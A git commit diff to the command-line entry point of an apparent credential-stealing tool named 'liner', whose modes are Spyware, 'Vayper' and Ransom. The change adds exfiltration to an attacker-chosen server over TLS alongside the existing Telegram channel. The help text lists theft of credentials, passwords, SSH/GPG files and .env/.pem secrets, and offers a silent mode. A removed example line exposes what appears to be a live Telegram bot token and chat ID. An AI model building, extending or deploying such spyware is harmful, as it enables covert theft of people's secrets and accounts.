b1f7e288c69da448576ef20804644bf2f9aff354
MNM <tc-mnm@hotmail.com>
2025-08-19 02:07:58 +0000

    Update main.go

--- cmd/main.go
+++ cmd/main.go
@@ -9,7 +9,7 @@ import (
 	"os/exec"
 	"strings"
 	"time"
-
+	
 	"github.com/Nowafen/liner/core"
 )
 
@@ -76,16 +76,20 @@ func updateTool() {
 }
 
 func printShortHelp() {
-	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> --token <TOKEN> --id <ID> [options]%s\n\n", ColorWhite, ColorReset)
+	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> {--telegram --token <TOKEN> --id <ID> | -s <IP> -p <PORT>} [options]%s\n\n", ColorWhite, ColorReset)
 	fmt.Printf("%sRequired flags:%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --mode        Operation mode (Spyware, Vayper, Ransom)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --dump        Data to dump (Credentials, Password, Session, privateDATA, all)%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s  --token       Telegram bot token%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s  --id          Telegram chat ID%s\n\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  --telegram    Use Telegram for data transfer%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  --token       Telegram bot token (required with --telegram)%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  --id          Telegram chat ID (required with --telegram)%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  -s, --server  Server IP or hostname (required if --telegram is not used)%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  -p, --port    Server port (required with --server)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%sOptional flags:%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --silent      Run in silent mode (no output)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --version     Show current version%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --update      Update tool to the latest version%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  -e, --encryption  Use TLS for server (yes/no, default: yes)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  -h, --help    Show this help message or full guide with examples%s\n\n", ColorWhite, ColorReset)
 	fmt.Printf("%sNote: Use --help for a detailed guide with examples.%s\n", ColorWhite, ColorReset)
 	if _, newerAvailable := checkVersion(); newerAvailable {
@@ -96,11 +100,11 @@ func printShortHelp() {
 
 func printFullHelp() {
 	fmt.Printf("%sLiner - A data collection and transfer tool (Version %s)%s\n\n", ColorWhite, CurrentVersion, ColorReset)
-	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> --token <TOKEN> --id <ID> [options]%s\n\n", ColorWhite, ColorReset)
+	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> {--telegram --token <TOKEN> --id <ID> | -s <IP> -p <PORT>} [options]%s\n\n", ColorWhite, ColorReset)
 	fmt.Printf("%sRequired flags:%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --mode <MODE>          Operation mode of the tool%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s                         Valid options: Spyware, Vayper, Ransom%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s                         - Spyware: Collects and sends specified data to Telegram%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s                         - Spyware: Collects and sends specified data%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s                         - Vayper: Not yet implemented%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s                         - Ransom: Not yet implemented%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --dump <DUMP>          Type of data to collect (for Spyware mode)%s\n", ColorWhite, ColorReset)
@@ -110,19 +114,25 @@ func printFullHelp() {
 	fmt.Printf("%s                         - Session: Collects files like .ssh/authorized_keys, .gnupg/pubring.kbx%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s                         - privateDATA: Collects sensitive files (*.env, *.pem, etc.)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s                         - all: Collects all of the above%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s  --token <TOKEN>        Telegram bot token for sending data%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s  --id <ID>              Telegram chat ID for receiving data%s\n\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  --telegram             Use Telegram for data transfer%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  --token <TOKEN>        Telegram bot token (required with --telegram)%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  --id <ID>              Telegram chat ID (required with --telegram)%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  -s, --server <IP>      Server IP or hostname (required if --telegram is not used)%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  -p, --port <PORT>      Server port (required with --server)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%sOptional flags:%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --silent               Run in silent mode (suppresses console output)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --version              Display the current version of the tool%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --update               Update the tool to the latest version%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  -e, --encryption <MODE>  Use TLS for server (yes/no, default: yes)%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  -h                     Show brief help message%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  --help                 Show this detailed guide%s\n\n", ColorWhite, ColorReset)
 	fmt.Printf("%sExamples:%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  Run Spyware mode to collect all data and send to Telegram:%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s    liner --mode Spyware --dump all --token 7456023166:AAEiB_YLmvjsFOk-7n_Tea5qTSxTxLpM3nQ --id 7706811633%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s  Run in silent mode:%s\n", ColorWhite, ColorReset)
-	fmt.Printf("%s    liner --mode Spyware --dump Credentials --token <TOKEN> --id <ID> --silent%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s    liner --mode Spyware --dump Password --telegram --token {Value} --id {Value}%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  Run Spyware mode to collect all data and send to server:%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s    liner --mode Spyware --dump all -s example.com -p 8080 -e yes%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s  Run in silent mode with server:%s\n", ColorWhite, ColorReset)
+	fmt.Printf("%s    liner --mode Spyware --dump Credentials -s example.com -p 8080 --silent%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  Check tool version:%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s    liner --version%s\n", ColorWhite, ColorReset)
 	fmt.Printf("%s  Update the tool:%s\n", ColorWhite, ColorReset)
@@ -138,8 +148,12 @@ func main() {
 	// Define CLI flags
 	mode := flag.String("mode", "", "Operation mode (Spyware, Vayper, Ransom)")
 	dump := flag.String("dump", "", "Data to dump (Credentials, Password, Session, privateDATA, all)")
+	telegram := flag.Bool("telegram", false, "Use Telegram for data transfer")
 	token := flag.String("token", "", "Telegram bot token")
 	chatID := flag.String("id", "", "Telegram chat ID")
+	server := flag.String("server", "", "Server IP or hostname")
+	port := flag.String("port", "", "Server port")
+	encryption := flag.String("encryption", "yes", "Use TLS for server (yes/no)")
 	silent := flag.Bool("silent", false, "Run in silent mode (no output)")
 	version := flag.Bool("version", false, "Show current version")
 	update := flag.Bool("update", false, "Update tool to the latest version")
@@ -174,7 +188,7 @@ func main() {
 
 	// Validate flag prefix (force -- instead of -)
 	for _, arg := range os.Args[1:] {
-		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && arg != "-h" {
+		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && arg != "-h" && arg != "-s" && arg != "-p" && arg != "-e" {
 			fmt.Printf("%s[ERROR]%s Flags must use -- prefix (e.g., --mode instead of -mode)%s\n",
 				ColorRed, ColorWhite, ColorReset)
 			printShortHelp()
@@ -183,22 +197,54 @@ func main() {
 	}
 
 	// Validate required flags
-	if *mode == "" || *token == "" || *chatID == "" {
-		fmt.Printf("%s[ERROR]%s --mode, --token, and --id are required%s\n",
-			ColorRed, ColorWhite, ColorReset)
+	if *mode == "" {
+		fmt.Printf("%s[ERROR]%s --mode is required%s\n", ColorRed, ColorWhite, ColorReset)
 		printShortHelp()
 		os.Exit(1)
 	}
 
-	// Handle modes
-	switch *mode {
-	case "Spyware":
+	// Validate Spyware mode specific flags
+	if *mode == "Spyware" {
 		if *dump == "" {
 			fmt.Printf("%s[ERROR]%s --dump is required for Spyware mode%s\n",
 				ColorRed, ColorWhite, ColorReset)
 			os.Exit(1)
 		}
-		err := core.Spyware(*dump, *token, *chatID, *silent)
+		if !*telegram && (*server == "" || *port == "") {
+			fmt.Printf("%s[ERROR]%s --server and --port are required if --telegram is not used%s\n",
+				ColorRed, ColorWhite, ColorReset)
+			printShortHelp()
+			os.Exit(1)
+		}
+		if *telegram && (*token == "" || *chatID == "") {
+			fmt.Printf("%s[ERROR]%s --token and --id are required with --telegram%s\n",
+				ColorRed, ColorWhite, ColorReset)
+			printShortHelp()
+			os.Exit(1)
+		}
+		if *telegram && *server != "" {
+			fmt.Printf("%s[ERROR]%s Cannot use --telegram and --server together%s\n",
+				ColorRed, ColorWhite, ColorReset)
+			printShortHelp()
+			os.Exit(1)
+		}
+		if *encryption != "yes" && *encryption != "no" {
+			fmt.Printf("%s[ERROR]%s --encryption must be 'yes' or 'no'%s\n",
+				ColorRed, ColorWhite, ColorReset)
+			printShortHelp()
+			os.Exit(1)
+		}
+	}
+
+	// Handle modes
+	switch *mode {
+	case "Spyware":
+		var err error
+		if *telegram {
+			err = core.Spyware(*dump, *token, *chatID, *silent)
+		} else {
+			err = core.SpywareServer(*dump, *server, *port, *encryption, *silent)
+		}
 		if err != nil {
 			if !*silent {
 				fmt.Printf("%s[WARNING]%s Error running Spyware: %v%s\n",
